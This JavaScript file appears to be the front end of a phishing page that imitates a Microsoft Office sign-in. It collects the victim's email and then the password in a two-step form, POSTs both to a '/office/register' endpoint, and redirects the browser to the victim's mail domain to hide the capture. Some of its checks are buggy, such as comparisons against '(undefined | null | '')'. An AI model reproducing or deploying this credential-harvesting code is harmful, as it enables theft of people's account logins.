var office = new class {
    constructor () {
        function isDomain( url){
            var ls = url.split(".")
            for (let index = 0; index < ls.length; index++) {
                const element = ls[index];
                if(element.indexOf('.') < 0){
                    return true;
                }
                else{
                    return false;
                }
            }
        }
        document.getElementById('change')
        .addEventListener( 'submit', ( e) => {
            e.preventDefault()
            var error = document.getElementById('error'),
            email = document.getElementById('email');
            if(!this.email) {
                if(email.value != ( undefined | null | '')) {
                    var pass = email.value 
                    email.setAttribute('placeholder', 'Enter Password')
                    email.setAttribute('type', 'password')
                    email.value = ''
                    document.getElementById('emailHolder').innerHTML = pass
                    document.getElementById('header').style = "display: none;"
                    this.email = pass
                }
                else{
                    error.innerHTML = "Enter a valid email"
                }
            }
            else{
                if(email != ( undefined | null | '')) {
                    email = email.value 
                    this.pass = email
                    fetch( '/office/register',{
                        method: "POST",
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            email: this.email,
                            pass: this.pass
                        })
                    })
                    .then( res => res.json())
                    .then( data => {
                        if( data.status == 1){
                            var url = this.email.split("@")[1]
                            while(!isDomain(url)){
                                url = url.split('.')
                            }
                            window.location.href = "https://"+url;
                        }
                        error.innerHTML = "Your email or password is incorrect"
                    })
                }
                else{
                    error.innerHTML = "Enter a valid email"
                }
            }
        })
    }
}